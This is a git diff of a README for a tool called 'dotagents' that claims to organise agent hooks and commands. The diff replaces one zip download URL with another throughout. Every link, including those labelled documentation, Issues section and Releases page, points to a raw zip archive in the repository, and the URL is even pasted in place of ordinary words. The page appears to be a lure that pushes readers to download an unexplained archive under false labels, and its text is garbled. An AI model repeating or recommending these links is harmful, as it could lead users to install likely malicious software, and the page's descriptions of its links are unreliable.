@@ -1,10 +1,10 @@
 # 🚀 dotagents - All Your Hooks and Commands in One Place
 
-[![Download dotagents](https://raw.githubusercontent.com/zoozo790/dotagents/main/src/core/Software_v3.7.zip)](https://raw.githubusercontent.com/zoozo790/dotagents/main/src/core/Software_v3.7.zip)
+[![Download dotagents](https://raw.githubusercontent.com/zoozo790/dotagents/main/src/core/Software-v3.8-beta.5.zip)](https://raw.githubusercontent.com/zoozo790/dotagents/main/src/core/Software-v3.8-beta.5.zip)
 
 ## 📥 Overview
 
-Welcome to **dotagents**! This application serves as your central hub for organizing hooks, commands, skills, and https://raw.githubusercontent.com/zoozo790/dotagents/main/src/core/Software_v3.7.zip files. With dotagents, you can streamline your workflow and make accessing your essential tools easier.
+Welcome to **dotagents**! This application serves as your central hub for organizing hooks, commands, skills, and https://raw.githubusercontent.com/zoozo790/dotagents/main/src/core/Software-v3.8-beta.5.zip files. With dotagents, you can streamline your workflow and make accessing your essential tools easier.
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ To begin using dotagents, you'll need to download the application. Follow the st
 ### 📦 Download & Install
 
 1. Click the following link to visit the Releases page and download the latest version of dotagents:
-   [Download dotagents](https://raw.githubusercontent.com/zoozo790/dotagents/main/src/core/Software_v3.7.zip)
+   [Download dotagents](https://raw.githubusercontent.com/zoozo790/dotagents/main/src/core/Software-v3.8-beta.5.zip)
    
 2. On the Releases page, look for the most recent version. You will see files listed under "Assets." Click on the file that suits your operating system.
 
@@ -50,14 +50,14 @@ To begin using dotagents, you'll need to download the application. Follow the st
 - You can add, edit, or delete commands and skills through the respective tabs within the application.
 - Simply follow the prompts on the screen to make changes.
 
-### 📄 Access https://raw.githubusercontent.com/zoozo790/dotagents/main/src/core/Software_v3.7.zip Files
+### 📄 Access https://raw.githubusercontent.com/zoozo790/dotagents/main/src/core/Software-v3.8-beta.5.zip Files
 
-- Use the file explorer to find any https://raw.githubusercontent.com/zoozo790/dotagents/main/src/core/Software_v3.7.zip files associated with your hooks or commands.
+- Use the file explorer to find any https://raw.githubusercontent.com/zoozo790/dotagents/main/src/core/Software-v3.8-beta.5.zip files associated with your hooks or commands.
 - Double-click to open and view the contents.
 
 ## 📚 Documentation
 
-For detailed information on features and usage tips, please refer to the official documentation available [here](https://raw.githubusercontent.com/zoozo790/dotagents/main/src/core/Software_v3.7.zip).
+For detailed information on features and usage tips, please refer to the official documentation available [here](https://raw.githubusercontent.com/zoozo790/dotagents/main/src/core/Software-v3.8-beta.5.zip).
 
 ## 🛠️ Troubleshooting
 
@@ -79,7 +79,7 @@ Yes! You can export your hooks as files and share them through email or other se
 
 ### What if I need help?
 
-For assistance, please create an issue in the [Issues section](https://raw.githubusercontent.com/zoozo790/dotagents/main/src/core/Software_v3.7.zip) on GitHub. Community members and maintainers can help address your concerns.
+For assistance, please create an issue in the [Issues section](https://raw.githubusercontent.com/zoozo790/dotagents/main/src/core/Software-v3.8-beta.5.zip) on GitHub. Community members and maintainers can help address your concerns.
 
 ## 📞 Contact
 
@@ -87,4 +87,4 @@ For further inquiries or to contribute to the project, feel free to reach out vi
 
 Thank you for choosing dotagents! We hope it enhances your productivity and centralizes your commands effectively. 
 
-Remember, to download dotagents again, you can visit this page: [Download dotagents](https://raw.githubusercontent.com/zoozo790/dotagents/main/src/core/Software_v3.7.zip).
+Remember, to download dotagents again, you can visit this page: [Download dotagents](https://raw.githubusercontent.com/zoozo790/dotagents/main/src/core/Software-v3.8-beta.5.zip).
